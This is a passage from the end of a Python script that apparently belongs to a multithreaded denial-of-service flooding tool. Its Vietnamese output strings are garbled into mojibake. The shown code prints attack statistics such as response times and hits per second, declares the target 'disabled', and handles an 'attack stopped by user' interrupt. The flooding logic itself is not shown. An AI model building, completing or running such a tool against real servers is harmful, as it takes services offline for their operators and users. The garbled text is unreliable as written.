‚îÇ üìà Th·ªùi gian ph·∫£n h·ªìi trung b√¨nh: {avg_response_time:.2f}ms     ‚îÇ
‚îÇ üèî Hi·ªáu su·∫•t ƒë·ªânh: {max_response_time:.2f}ms                   ‚îÇ
‚îÇ üèû ƒê·ªô tr·ªÖ t·ªëi thi·ªÉu: {min_response_time:.2f}ms                 ‚îÇ
‚îÇ ‚ö° L∆∞·ª£t ƒë√°nh/gi√¢y: {(NUM_THREADS * REQUESTS_PER_THREAD)/total_time:.0f} ‚îÇ
‚îÇ üéØ M·ª§C TI√äU B·ªä V√î HI·ªÜU H√ìA!                                  ‚îÇ
‚îî{'‚îÄ' * 51}‚îò
{Style.RESET_ALL}
            """)

        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}{Style.BRIGHT}‚ùå [H·ªÜ TH·ªêNG] T·∫•n c√¥ng b·ªã d·ª´ng b·ªüi ng∆∞·ªùi d√πng{Style.RESET_ALL}")
            exit(0)
        except Exception as e:
            print(f"{Fore.RED}{Style.BRIGHT}üö® [H·ªÜ TH·ªêNG] L·ªói nghi√™m tr·ªçng: {str(e)}{Style.RESET_ALL}")
            exit(1)

if __name__ == "__main__":
    main()